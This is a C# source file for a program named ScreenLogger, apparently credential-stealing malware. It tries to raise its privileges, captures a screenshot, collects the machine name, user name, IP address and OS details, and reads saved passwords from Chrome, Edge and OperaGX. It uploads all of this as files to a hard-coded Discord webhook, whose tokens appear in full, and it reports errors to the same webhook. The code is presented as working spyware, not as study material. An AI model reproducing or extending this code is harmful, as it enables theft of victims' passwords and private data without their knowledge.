using Microsoft.Data.Sqlite;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Threading;

namespace ScreenLogger
{
    internal class Program
    {
        public static bool privateMode = false;
        public static bool halted = true;
        static void Main(string[] args)
        {
            try
            {
                //gain admin privs.
                UNPRightsEsc.Init();
                while (halted) ;

                // Take screenshot
                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                               Screen.PrimaryScreen.Bounds.Height,
                                               System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                Graphics graphics = Graphics.FromImage(screenshot);
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                // Save screenshot to memory stream
                MemoryStream stream = new MemoryStream();
                screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);

                //get chrome passwords (TESTING)
                //List<PReaderInterface> readers = new List<PReaderInterface>();
                //readers.Add(new OperaGX());

                //SQLitePCL.Batteries.Init();

                //foreach (var reader in readers)
                //{
                //    Console.WriteLine($"------{reader.BrowserName}");
                //    try
                //    {
                //        Utils.PrintCredentials(reader.ReadPasswords());
                //    }
                //    catch (Exception ex)
                //    {
                //        Console.WriteLine($"Error reading {reader.BrowserName} passwords: " + ex.Message);
                //    }
                //}

                //get ip
                string ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.First().ToString();
                if (privateMode)
                {
                    ip = "Privacy Mode Enabled.";
                }

                // Send screenshot to Discord webhook
                byte[] imageBytes = stream.ToArray();
                string webhookUrl = "https://discord.com/api/webhooks/1072035273065631754/dQqz9vI-OdNh5uqwddt2W-zgHWyruOdLLkAEC2l6tgUojgqnI2xYMWTd4h6dpT7UUPKN"; //"https://discord.com/api/webhooks/1071565067109277706/Aq1uuQZJrQkOC6mZUGjr0lnQfr3qN2Dt6zRNELyaqqkMrbKpLYv9DRQ8YDwxiGA2DU-L";
                HttpClient client = new HttpClient();
                MultipartFormDataContent formDataContent = new MultipartFormDataContent
                {
                    { new StringContent(
                        "Screenshot from Device Name: " + Dns.GetHostName()
                        + "\nUser Profile Name: " + Environment.UserName
                        + $"\nIP Address (IPV4_MAPPED_IPV6={ Dns.GetHostEntry(Dns.GetHostName()).AddressList.First().IsIPv4MappedToIPv6}): " + ip
                        + "\nOS: " + Environment.OSVersion.ToString()
                        + "\nOSVersion: " + Environment.OSVersion.Platform.ToString()
                        + "\n64bitOS: " + Environment.Is64BitOperatingSystem
                        ,Encoding.UTF8),"\"content\"" },
                    { new ByteArrayContent(imageBytes, 0, imageBytes.Length), ".png", "screenshot.png" },
                };
                Utils.AddTextFile(formDataContent, Utils.GetCredentialString(new Chrome().ReadPasswords()),"Chrome.txt");
                Utils.AddTextFile(formDataContent, Utils.GetCredentialString(new Edge().ReadPasswords()),"Edge.txt");
                Utils.AddTextFile(formDataContent, Utils.GetCredentialString(new OperaGX().ReadPasswords()),"OperaGX.txt");
                client.PostAsync(webhookUrl, formDataContent).Wait();
                client.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                string webhookUrl = "https://discord.com/api/webhooks/1072035273065631754/dQqz9vI-OdNh5uqwddt2W-zgHWyruOdLLkAEC2l6tgUojgqnI2xYMWTd4h6dpT7UUPKN"; //"https://discord.com/api/webhooks/1071565067109277706/Aq1uuQZJrQkOC6mZUGjr0lnQfr3qN2Dt6zRNELyaqqkMrbKpLYv9DRQ8YDwxiGA2DU-L";
                HttpClient client = new HttpClient();
                MultipartFormDataContent formDataContent = new MultipartFormDataContent
                {
                    { new StringContent("Logger Threw Exception: " + ex.StackTrace) }
                };
                client.PostAsync(webhookUrl, formDataContent).Wait();
                Console.ReadLine();
            }
            finally
            {
                Console.WriteLine("Completed.");
            }

        }
    }
}
